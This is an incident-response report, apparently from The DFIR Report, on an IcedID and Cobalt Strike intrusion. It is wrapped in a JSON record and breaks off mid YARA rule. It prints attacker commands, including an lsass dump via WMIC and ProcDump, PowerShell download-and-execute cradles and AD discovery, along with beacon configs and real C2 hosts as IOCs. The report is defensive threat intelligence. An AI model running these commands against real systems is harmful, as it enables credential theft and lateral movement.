{
    "id": "feab87e2-5661-4676-8f69-5c7064f91694",
    "created_at": "2023-01-12T15:01:12.323127Z",
    "updated_at": "2025-03-27T02:09:17.983973Z",
    "deleted_at": null,
    "sha1_hash": "29a6227cc74ba59834a45c84a448385dbc1bacd1",
    "title": "2021-07-19 - IcedID and Cobalt Strike vs Antivirus",
    "authors": "",
    "file_creation_date": "2022-05-28T18:04:04Z",
    "file_modification_date": "2022-05-28T18:04:04Z",
    "file_size": 2735301,
    "plain_text": "# IcedID and Cobalt Strike vs Antivirus\n\n**[thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/](https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/)**\n\n### Intro\n\n\nJuly 19, 2021\n\n\n#### Although IcedID was originally discovered back in 2017, it did not gain in popularity until the latter half of 2020. We have now analyzed a couple ransomware cases in 2021 (Sodinokibi & Conti) that used IcedID as the initial foothold into the environment.\n\n In June, we saw another threat actor utilize IcedID to download Cobalt Strike, which was used to pivot to other systems in the environment. Similar to the Sodinokibi case, anti-virus (AV) slowed down the attackers. AV frustrated them to the point they temporarily left the environment. Eleven days later, activity returned to the environment with more Cobalt Strike beacons, which they used to pivot throughout the domain using WMI. The threat actors, however, remained unable or unwilling to complete their final objectives.\n\n### Case Summary\n\n#### This intrusion once again highlights common tools in-use today for Initial Access and Post- Exploitation. Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file. This HTA file is used to download IcedID in the form of a JPG file. This file is actually a Windows DLL file, which is executed via regsvr32 (1st stage IcedID).\n\n IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll – IcedID – used for persistence) and regsvr32 (ekix4.dll – Cobalt Strike beacon – privilege escalation via fodhelper) to pillage the domain. Service Execution\n\n\n-----\n\n#### (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.\n\n WMIC was utilized to launch ProcDump in an attempt to dump lsass.exe. WMIC was also used to perform discovery of endpoint security software. A flurry of other programs were used to perform discovery within the environment including nltest.exe, adfind.exe via adf.bat, and net.exe. Command and Control was achieved via IcedID and Cobalt Strike.\n\n There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success. Ultimately, the threat actors were unsuccessful when AV snagged their attempts to move to certain servers. \n\n Particular to this case, we saw an eleven day gap in activity. While command and control never left, activity–other than beaconing, ceased. On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.\n\n This may indicate a hand off to a new group, or the original actor may have returned, either way, we did not see a final action on objectives.\n\n### Services\n\n#### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here. Two of the Cobalt Strike servers used in this intrusion were added to our Threat Feed on 6/3/21 and the other one was added on 6/14/21\n\n We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n\n-----\n\n-----\n\n#### Analysis and reporting completed by @iiamaleks and @THIR_Sec\n\n Reviewed by @ICSNick and @MetallicHack\n\n### MITRE ATT&CK\n\n Initial Access\n\n#### Initial access for this intrusion was via a malicious attachment “order 06.21.doc”. The attachment was a Microsoft Word document that drops a malicious HTA file “textboxNameNamespace.hta”.\n\n### Execution\n\n#### Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded from http://povertyboring2020b[.]com. This file’s extension is misleading as the file is a Windows DLL.\n\n The HTA file is written to:\n```\n C:\\users\\public\n\n```\n\n-----\n\n#### The HTA file when executed downloads a file named “textboxNameNamespace.jpg”, which is actually an IcedID DLL file responsible for the first stage.\n\n Through the same HTA file, the IcedID first stage DLL file is executed via regsvr32.exe.\n\n IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.\n\n After the initial compromise, the threat actors went silent for eleven days. After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.\n\n### Persistence\n\n#### IcedID establishes persistence on the compromised host using a scheduled task named ‘{0AC9D96E-050C-56DB-87FA-955301D93AB5}’ that executes its second stage. This scheduled task was observed to be executing hourly under the initially compromised user.\n\n\n-----\n\n### Privilege Escalation\n\n#### Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.\n\n Additional Cobalt Strike payloads were executed with the same fodhelper UAC bypass technique.\n\n Cobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user. This activity was observed on workstations, a file server, and a backup server.\n\n GetSystem was also used by the threat actors.\n\n### Credential Access\n\n#### The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.\n\n\n-----\n\n```\nATTACK [PTsecurity] Overpass the hash. Encryption downgrade activity to ARCFOUR-HMACMD5\",10002228\n\n```\n\n-----\n\n#### Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.\n```\ncmd.exe /C wmic /node:\"servername.domainname\" process call create\n\"C:\\PerfLogs\\procdump.exe -accepteula -ma lsass C:\\PerfLogs\\lsass.dmp\"\n\n This activity appears to have failed due to Windows Defender activity.\n\n### Discovery\n\n#### IcedID initially performed some discovery of the local system and the domain.\n\n```\n\n-----\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get \n/Format:List\nipconfig /all systeminfo\nnet config workstation\nnet view /all /domain nltest /domain_trusts /all_trusts\nnltest /domain_trusts\nnet view /all\nnet group \"Domain Admins\" /domain\n\n#### Later, Cobalt Strike beacons were used to perform discovery of the system and domain.\ncmd.exe /C systeminfo\ncmd.exe /C nltest /dclist:DOMAIN.local\ncmd.exe /C nltest /domain_trusts /all_trusts\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:55869/'); FindLocalAdminAccess\n\n A discovery batch script that runs ADFind.exe was dropped to the system.\n\n ADFind.exe was executed by the discovery batch script.\ncmd.exe /C C:\\Windows\\Temp\\adf\\adf.bat\nadfind.exe -f \"(objectcategory=person)\"\nadfind.exe -f \"(objectcategory=organizationalUnit)\"\nadfind.exe -f \"objectcategory=computer\"\nadfind.exe -sc trustdmp\nadfind.exe -subnets -f (objectCategory=subnet)\nadfind.exe -f \"(objectcategory=group)\"\nadfind.exe -gcb -sc trustdmp\n\n PowerView was used to discover local administrator access in the network. The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.\n\n```\n\n-----\n\n#### Cobalt Strike was injected into the winlogon.exe process and used to perform further discovery.\n```\ncmd.exe /C net group \"domain Admins\" /domain\ncmd.exe /C net group \"Enterprise Admins\" /domain\ncmd.exe /C ping WORKSTATION\ncmd.exe /C net view \\\\WORKSTATION /all \ncmd.exe /C net view \\\\DOMAINCONTROLLER /all\ncmd.exe /C dir /s\n\n The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.\n\n```\n\n-----\n\n```\nIEX (New Object Net.Webclient).DownloadString( http://127.0.0.1:41046/ ); Get\nDomainController\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:38102/'); GetDomainComputer -Properties dnshostname\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:35452/'); GetDomainComputer -OperatingSystem *server* -Properties dnshostname\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:61999/'); GetDomainComputer -Properties dnshostname -Ping.\n$dr=Get-WmiObject Win32_LogicalDisk; $total=0; foreach($i in $dr){ ; if($i.DriveType\n-eq 3 ){$diskFill = ([int]($i.Size/1GB)-[int]\n($i.FreeSpace/1GB));$total=$total+$diskFill;} } 'Total ' + $env:computername +' ' +\n$total\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:51127/'); Get-PSDrive\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:34025/'); InvokeShareFinder -Ping -CheckShareAccess -Verbose | Out-File -Encoding ascii\nC:\\ProgramData\\shar.txt\n\n### Lateral Movement\n\n#### Lateral Movement chain #1 – The attacker was able to successfully move from workstation #1 to workstation #2 via service execution. The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.\n\n Lateral Movement chain #2 – Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV. Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.\n\n```\n\n-----\n\n#### Lateral Movement chain #3 – Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike ‘GetSystem’ command which makes use of named pipes. A Cobalt Strike DLL was copied to a server and executed using WMI. This activity was observed on three servers, including the Domain Controller.\n\n### Command and Control\n\n#### The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.\n\n\n-----\n\n```\n91.193.19.37|443\nlookupup.uno\n45.153.240.135|443\nagalere.club\n12horroser.fun\n172.67.222.68|80\nfintopikasling.top\n185.38.185.121|443\ncontocontinue.agency\n164.90.157.246|443\n109.230.199.73|80\n\n#### The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.\n\n```\n\n-----\n\n#### Cobalt Strike Configs:\n\n krinsop[.]com 162.244.81.62 (added to Threat Feed on 2021-06-14)\n\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3S: aa29d305dff6e6ac9cd244a62c6ad0c2\nCertificate Subject Key Identifier:\n23:FA:7E:CD:F4:13:7C:96:30:AC:3C:DD:D6:25:99:DB:39:39:51:B3\nNot Before: Jun 4 18:57:59 2021 (GMT)\nNot After : Sep 2 18:57:59 2021 (GMT)\nIssuer: Let's Encrypt\nSubject Common: krinsop.com\nPublic Algorithm: rsaEncryption\n\n```\n\n-----\n\n```\n{\n\"x86\": {\n\"config\": {\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"Polling\": 5000,\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"C2 Server\": \"162.244.81.62,/jquery-3.3.1.min.js\",\n\"Method 1\": \"GET\",\n\"Jitter\": 10,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\"Port\": 80,\n\"Method 2\": \"POST\",\n\"Beacon Type\": \"0 (HTTP)\"\n},\n\"sha256\": \"198cbe9ac054c0d79229b9d09fcbfbe5caa7702969f1f588eeca4f66318ebf12\",\n\"md5\": \"fb325956bbaf5f34ee8f3876a6c14d62\",\n\"sha1\": \"1b3c8375ad2087e647b44faf9b8c6460ad9ae97c\",\n\"time\": 1623709908992.6\n},\n\"x64\": {\n\"config\": {\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"Polling\": 5000,\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"C2 Server\": \"162.244.81.62,/jquery-3.3.1.min.js\",\n\"Method 1\": \"GET\",\n\"Jitter\": 10,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\"Port\": 80,\n\"Method 2\": \"POST\",\n\"Beacon Type\": \"0 (HTTP)\"\n},\n\"sha256\": \"9e1261fcefa27729712a78c4c1938987d1a57983839b588c6cb5bd23850d98e1\",\n\"md5\": \"cef2407d87d56f2656d502ae3f6e49f2\",\n\"sha1\": \"6810f5d44b21377b084b96151ab25e57e7d90abe\",\n\"time\": 1623709920309.7\n}\n}\n{\n\"x86\": {\n\"config\": {\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"Polling\": 5000,\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"C2 Server\": \"krinsop.com,/jquery-3.3.1.min.js\",\n\"Method 1\": \"GET\",\n\"Jitter\": 10,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\"Port\": 443,\n\"Method 2\": \"POST\",\n\"Beacon Type\": \"8 (HTTPS)\"\n},\n\"sha256\": \"aa76fb1fa50a24c631a5d40878cc7af8a23ba265842bd9e85578d85f080b203a\",\n\"md5\": \"c4e04de7283fcddc4f3e394313e02a8d\",\n\"sha1\": \"edee07063c98ed57e12e41196c9bea63a3a0f4ee\",\n\n```\n\n-----\n\n```\n time : 1623709904481.3\n},\n\"x64\": {\n\"config\": {\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"Polling\": 5000,\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"C2 Server\": \"krinsop.com,/jquery-3.3.1.min.js\",\n\"Method 1\": \"GET\",\n\"Jitter\": 10,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n\"Port\": 443,\n\"Method 2\": \"POST\",\n\"Beacon Type\": \"8 (HTTPS)\"\n},\n\"sha256\": \"b888d289ee46115ed33164855e74f21e9e2b657c3d11342b34d267a722e137eb\",\n\"md5\": \"2562d3b97b8352b785020a7ab7ac334f\",\n\"sha1\": \"80389f85fe8bbca65ca35bfa219b6e2a2815069d\",\n\"time\": 1623709913218.1\n}\n}\n\n#### charity-wallet[.]com 213.252.245.62 (added to Threat Feed on 2021-06-03)\n\n```\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3S: ae4edc6faf64d08308082ad26be60767\nCertificate Subject Key Identifier:\n0F:9E:24:12:4D:36:90:93:55:B5:8D:C1:26:0D:2F:79:BE:C2:78:9B\nNot Before: May 26 07:48:00 2021 GMT\nNot After : Aug 24 07:48:00 2021 GMT\nIssuer Org: Let's Encrypt\nSubject Common: charity-wallet.com\nPublic Algorithm: rsaEncryption\n\n```\n\n-----\n\n```\n{\n\"x64\": {\n\"md5\": \"c282bfab34469e2884ea0a964f7faf86\",\n\"sha256\": \"4fb85bef421d23361fce6c7d00ed5047dd47e0ebaf1769be96b10c83c99441f8\",\n\"config\": {\n\"Jitter\": 37,\n\"Method 1\": \"GET\",\n\"Beacon Type\": \"8 (HTTPS)\",\n\"Polling\": 63565,\n\"Method 2\": \"POST\",\n\"Port\": 443,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\regsvr32.exe\",\n\"C2 Server\": \"charity-wallet.com,/ch.html\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\regsvr32.exe\",\n\"HTTP Method Path 2\": \"/ba\"\n},\n\"time\": 1622753776178.3,\n\"sha1\": \"797d697c7a6770b2caa8e3b6c5e2e7b5ab7cc55b\"\n},\n\"x86\": {\n\"md5\": \"ed2dbbd89fb9abad7086f71def9f7cf5\",\n\"sha256\": \"6477ba90a44152ca98107c0bd00161a8a61daf32418654bc8c0f27e01eb43303\",\n\"config\": {\n\"Jitter\": 37,\n\"Method 1\": \"GET\",\n\"Beacon Type\": \"8 (HTTPS)\",\n\"Polling\": 63565,\n\"Method 2\": \"POST\",\n\"Port\": 443,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\regsvr32.exe\",\n\"C2 Server\": \"charity-wallet.com,/ch.html\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\regsvr32.exe\",\n\"HTTP Method Path 2\": \"/ba\"\n},\n\"time\": 1622753770976.5,\n\"sha1\": \"d1b9040e8bf1db317c18f903ab95f44b30736a78\"\n}\n}\n\n#### gmbfrom[.]com 88.80.147.101 (added to Threat Feed on 2021-06-03)\n\n```\n\n-----\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3S: ae4edc6faf64d08308082ad26be60767\nCertificate: 04:2f:14:f8:9d:82:a2:39:2e:ea:8e:4f:c1:b7:0d:b8:bf:a7 Not Before: May 20\n15:55:27 2021 GMT\nNot After : Aug 18 15:55:27 2021 GMT\nIssuer Org: Let's Encrypt\nSubject Common: gmbfrom.com\nPublic Algorithm: rsaEncryption\n{\n\"x86\": {\n\"sha1\": \"b785cae596f7b68376464e3e300fe0aff5bea845\",\n\"config\": {\n\"Method 2\": \"POST\",\n\"Port\": 80,\n\"Method 1\": \"GET\",\n\"Polling\": 5000,\n\"Beacon Type\": \"0 (HTTP)\",\n\"Jitter\": 10,\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"C2 Server\": \"88.80.147.101,/jquery-3.3.1.min.js\",\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\"\n},\n\"time\": 1622753064031.5,\n\"sha256\": \"dd0dd0b3e95ff62c45af048c0169e2631ac906da4a603cadbc7014cbcfb4e631\",\n\"md5\": \"56830f9cc0fe712e22921a7a5a0f1a53\"\n},\n\"x64\": {\n\"sha1\": \"11724324f8ec1940be87553ae2bd5f96b979a5d6\",\n\"config\": {\n\"Method 2\": \"POST\",\n\"Port\": 80,\n\"Method 1\": \"GET\",\n\"Polling\": 5000,\n\"Beacon Type\": \"0 (HTTP)\",\n\"Jitter\": 10,\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\"C2 Server\": \"88.80.147.101,/jquery-3.3.1.min.js\",\n\"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\"\n},\n\"time\": 1622753068830.2,\n\"sha256\": \"36a5e68810f3823470fadd578efb75b5c2d1ffe9f4a16d5566f0722257cc51ce\",\n\"md5\": \"9dde7f14a076a5c3db8f4472b87fd11e\"\n}\n}\n\n### Impact\n\n#### We did not observe the final actions of the threat actors during this intrusion.\n\n### IOCs\n\n```\n\n-----\n\n### Network\n```\n88.80.147.101|443\ngmbfrom.com\n213.252.245.62|443\ncharity-wallet.com\n162.244.81.62|443\nkrinsop.com\n91.193.19.37|443\nlookupup.uno\n45.153.240.135|443\nagalere.club\n12horroser.fun\n172.67.222.68|80\nfintopikasling.top\n185.38.185.121|443\ncontocontinue.agency\n164.90.157.246|443\n109.230.199.73|80\nhttp://povertyboring2020b[.]com\npovertyboring2020b[.]com\n\n File\norder 06.21.doc\nb1254d3fa38e2418734d4a2851fc22a6\n7c71a7ae38ef95d36434f0b680b30393de9b95ec\n95af2e46631be234a51785845079265629462e809e667081eb0b723116e265f3\nekix4.dll\n74b91ef6278231c152259f58f0420ad4\ncbcd475e05642f7e0a049827c6a3c722046c591d\ne27b71bd1ba7e1f166c2553f7f6dba1d6e25fa2f3bb4d08d156073d49cbc360a\ntextboxNameNamespace.hta\ndecfd224c4317795dd7716c680a29dcb\n42c52ad41878deeecfe6526431a1e0bf34311286\nb17c7316f5972fff42085f7313f19ce1c69b17bf61c107b1ccf94549d495fa42\ntextboxNameNamespace.jpg\n13c928acdec1cc1682ed84d27b83841a\nf90fb56e148b17af89a896bbb0ba0b89fc0ecdb2\n010f52eda70eb9ff453e3af6f3d9d20cbda0c4075feb49c209ca1c250c676775\nadf.bat\nb94bb0ae5a8a029ba2fbb47d055e22bd\n035940bd120a72e2da1b6b7bb8b4efab46232761\nf6a377ba145a5503b5eb942d17645502eddf3a619d26a7b60df80a345917aaa2\nMuif.dll\n9e7756f47e57a03e6eb5fe7d2505b870\nfb6339704bf11507038ddaf8f01324da5b71ee19\n8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab\n\n## Detections\n\n### Network\n\n```\n\n-----\n\n```\nET DNS Query to a .top domain Likely Hostile\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\nATTACK [PTsecurity] Overpass the hash. Encryption downgrade activity to ARCFOUR-HMACMD5\n\n### Sigma\n\n#### https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_powershell_enc_cmd.yml\n\n https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_procdump_lsass.yml\n\n https://github.com/SigmaHQ/sigma/blob/99b0d32cec5746c8f9a79ddbbeb53391cef326ba/rul es/windows/process_creation/win_trust_discovery.yml\n\n https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_ad_find_discovery.yml\n\n https://github.com/SigmaHQ/sigma/blob/7288ae93b9ec8d09f56cdc623a44a21fa0826afb/rule s/windows/process_creation/process_creation_cobaltstrike_load_by_rundll32.yml\n\n https://github.com/SigmaHQ/sigma/blob/bbe67ddc73adaa245941fe240db4eff3279078a8/rul es/windows/registry_event/sysmon_cobaltstrike_service_installs.yml\n\n https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_uac_fodhelper.yml\n\n https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/builtin/win_pass_the_hash_2.yml\n\n### Yara\n\n```\n\n-----\n\n```\n/\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-07-13\nIdentifier: Case 4485\nReference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule textboxNameNamespace {\nmeta:\ndescription = \"4485 - file textboxNameNamespace.hta\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-13\"\nhash1 = \"b17c7316f5972fff42085f7313f19ce1c69b17bf61c107b1ccf94549d495fa42\"\nstrings:\n$s1 =\n\"idGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gTG1lciByYXY7KSJsbGVo\n ascii /* base64 encoded string 'tcejbometsyselif.gnitpircs\"(tcejbOXevitcA wen = Lmer\nrav;)\"llehs.tpircsw\"(tcejbOXevitcA wen = e' */\n$s2 = \"/<html><body><div\nid='variantDel'>fX17KWUoaGN0YWN9O2Vzb2xjLnRzbm9Dbm90dHVCd2VpdjspMiAsImdwai5lY2Fwc2VtYU\n ascii\n$s3 = \"oveTo(-100, -100);var swapLength =\ntplNext.getElementById('variantDel').innerHTML.split(\\\"aGVsbG8\\\");var textSinLibrary\n= ptrSin\" ascii\n$s4 = \"wxyz0123456789+/</div><script language='javascript'>function\nvarMainInt(tmpRepo){return(new ActiveXObject(tmpRepo));}function bt\" ascii\n$s5 =\n\"VwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMudHNub0Nub3R0dUJ3ZWl2Oyl5ZG9iZXNub3BzZXIuZXRhREl4b2J\n ascii\n$s6 = \"ript><script language='vbscript'>Function byteNamespaceReference(variantDel) :\nSet WLength = CreateObject(queryBoolSize) : With \" ascii\n$s7 = \"WLength : .language = \\\"jscript\\\" : .timeout = 60000 : .eval(variantDel) : End\nWith : End Function</script><script language='vbs\" ascii\n$s8 =\n\"FkZGEvbW9jLmIwMjAyZ25pcm9ieXRyZXZvcC8vOnB0dGgiICwiVEVHIihuZXBvLmV0YURJeG9idHhldDspInB\n ascii\n$s9 =\n\"pJMTZBb0hjcXBYbVI1ZUI0YXF0SVhWWlZkRkhvZjFEZy9qYWVMTGlmc3doOW9EaEl2QlllYnV1dWxPdktuQWF\n ascii\n$s10 =\n\"B5dC50c25vQ25vdHR1QndlaXY7bmVwby50c25vQ25vdHR1QndlaXY7KSJtYWVydHMuYmRvZGEiKHRjZWpiT1h\n ascii\n$s11 = \"t><script language='javascript'>libView['close']();</script></body></html>\"\nfullword ascii\n$s12 =\n\"t5cnR7KTAwMiA9PSBzdXRhdHMuZXRhREl4b2J0eGV0KGZpOykoZG5lcy5ldGFESXhvYnR4ZXQ7KWVzbGFmICw\n ascii\n$s13 = \"tYU5vcmV6IHJhdg==aGVsbG8msscriptcontrol.scriptcontrol</div><div\nid='exLeftLink'>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv\" ascii\n\n```\n\n-----\n\n```\n$s14 nGlob(pasteVariable)\n{return(tplNext.getElementById(pasteVariable).innerHTML);}function lConvert()\n{return(btnGlob('exLeftLink'));\" ascii\n$s15 = \"ipt'>Call byteNamespaceReference(textSinLibrary)</script><script\nlanguage='vbscript'>Call byteNamespaceReference(remData)</scrip\" ascii\n$s16 = \"Ex](x)];b=(b<<6)+c;l+=6;while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&\n(vbaBD+=w(a));}}return(vbaBD);};function ptrSingleOpt(be\" ascii\n$s17 = \"eOpt(bytesGeneric(swapLength[0]));var remData =\nptrSingleOpt(bytesGeneric(swapLength[1]));var queryBoolSize = swapLength[2];</sc\"\nascii\n$s18 = \"}function bytesGeneric(s){var e={}; var i; var b=0; var c; var x; var l=0;\nvar a; var vbaBD=''; var w=String.fromCharCode; var L\" ascii\n$s19 = \"=s.length;var counterEx = ptrSingleOpt('tArahc');for(i=0;i<64;i++)\n{e[lConvert()[counterEx](i)]=i;}for(x=0;x<L;x++){c=e[s[counter\" ascii\n$s20 = \"foreRight){return beforeRight.split('').reverse().join('');}libView =\nwindow;tplNext = document;libView.resizeTo(1, 1);libView.m\" ascii\ncondition:\nuint16(0) == 0x3c2f and filesize < 7KB and\n8 of them\n}\nrule case_4485_adf {\nmeta:\ndescription = \"files - file adf.bat\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-13\"\nhash1 = \"f6a377ba145a5503b5eb942d17645502eddf3a619d26a7b60df80a345917aaa2\"\nstrings:\n$s2 = \"adfind.exe -f \\\"(objectcategory=person)\\\" > ad_users.txt\" fullword ascii\n$s3 = \"adfind.exe -f \\\"objectcategory=computer\\\" > ad_computers.txt\" fullword ascii\n$s4 = \"adfind.exe -gcb -sc trustdmp > trustdmp.txt\" fullword ascii\n$s5 = \"adfind.exe -sc trustdmp > trustdmp.txt\" fullword ascii\n$s6 = \"adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt\" fullword ascii\n$s7 = \"adfind.exe -f \\\"(objectcategory=group)\\\" > ad_group.txt\" fullword ascii\n$s8 = \"adfind.exe -f \\\"(objectcategory=organizationalUnit)\\\" > ad_ous.txt\" fullword\nascii\ncondition:\nuint16(0) == 0x6463 and filesize < 1KB and all of them\n}\nrule case_4485_Muif {\nmeta:\ndescription = \"4485 - file Muif.dll\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-13\"\nhash1 = \"8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab\"\nstrings:\n$s1 = \"Common causes completion include incomplete download and damaged media\"\nfullword ascii\n$s2 = \"An error occurred writing to the file\" fullword ascii\n$s3 = \"asks should be performed?\" fullword ascii\n$s4 = \"The waiting time for the end of the launch was exceeded for an unknown reason\"\nfullword ascii\n\n```\n\n-----\n\n```\n$s5 Select the Start Menu folder in which you would like Setup to create the\nprograms shortcuts, then click Next. Which additional t\" ascii\n$s6 = \"HcA<E3\" fullword ascii /* Goodware String - occured 1 times */\n$s7 = \"D$([email protected]\" fullword ascii /* Goodware String - occured 1 times */\n$s8 = \"Select the Start Menu folder in which you would like Setup to create the\nprograms shortcuts, then click Next. Which additional t\" ascii\n$s9 = \"Please verify that the correct path and file name are given\" fullword ascii\n$s10 = \"Critical error\" fullword ascii\n$s11 = \"Please read this information carefully\" fullword ascii\n$s12 = \"Unknown error occurred for time: \" fullword ascii\n$s13 = \"E 3y4i\" fullword ascii\n$s14 = \"D$tOuo2\" fullword ascii\n$s15 = \"D$PH9D$8tXH\" fullword ascii\n$s16 = \"E$hik7\" fullword ascii\n$s17 = \"D$p]mjk\" fullword ascii\n$s18 = \"B):0~\\\"Z\" fullword ascii\n$s19 = \"Richo/\" fullword ascii\n$s20 = \"D$xJij\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 70KB and\n( pe.imphash() == \"42205b145650671fa4469a6321ccf8bf\" and pe.exports(\"StartW\") or 8 of\nthem )\n}\nrule textboxNameNamespace_2 {\nmeta:\ndescription = \"4485 - file textboxNameNamespace.jpg\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-13\"\nhash1 = \"010f52eda70eb9ff453e3af6f3d9d20cbda0c4075feb49c209ca1c250c676775\"\nstrings:\n$s1 = \"uwunhkqlzle.dll\" fullword ascii\n$s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s3 = \"operator co_await\" fullword ascii\n$s4 = \"ggeaxcx\" fullword ascii\n$s5 = \"wttfzwz\" fullword ascii\n$s6 = \"fefewzydtdu\" fullword ascii\n$s7 = \"ilaeemjyjwzjwj\" fullword ascii\n$s8 = \"enhzmqryc\" fullword ascii\n$s9 = \"flchfonfpzcwyrg\" fullword ascii\n$s10 = \"dayhcsokc\" fullword ascii\n$s11 = \"mtqnlfpbxghmlupsn\" fullword ascii\n$s12 = \"zqeoctx\" fullword ascii\n$s13 = \"ryntfydpykrdcftxx\" fullword ascii\n$s14 = \"atxvtwd\" fullword ascii\n$s15 = \"icjshmfrldy\" fullword ascii\n$s16 = \"lenkuktrncmxiafgl\" fullword ascii\n$s17 = \"alshaswlqmhptxpc\" fullword ascii\n$s18 = \"izonphi\" fullword ascii\n$s19 = \"atttyokowqnj\" fullword ascii\n$s20 = \"nwvohpazb\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 500KB and\n( pe.imphash() == \"4d46e641e0220fb18198a7e15fa6f49f\" and ( pe.exports(\"PluginInit\")\n\n```\n\n-----\n\n```\nand pe.exports( alshaswlqmhptxpc ) and pe.exports( amgqilvxdufvpdbwb ) and\npe.exports(\"atttyokowqnj\") and pe.exports(\"atxvtwd\") and pe.exports(\"ayawgsgkusfjmq\")\n) or 8 of them )\n}\nrule case_4485_ekix4 {\nmeta:\ndescription = \"4485 - file ekix4.dll\"\nauthor = \"The 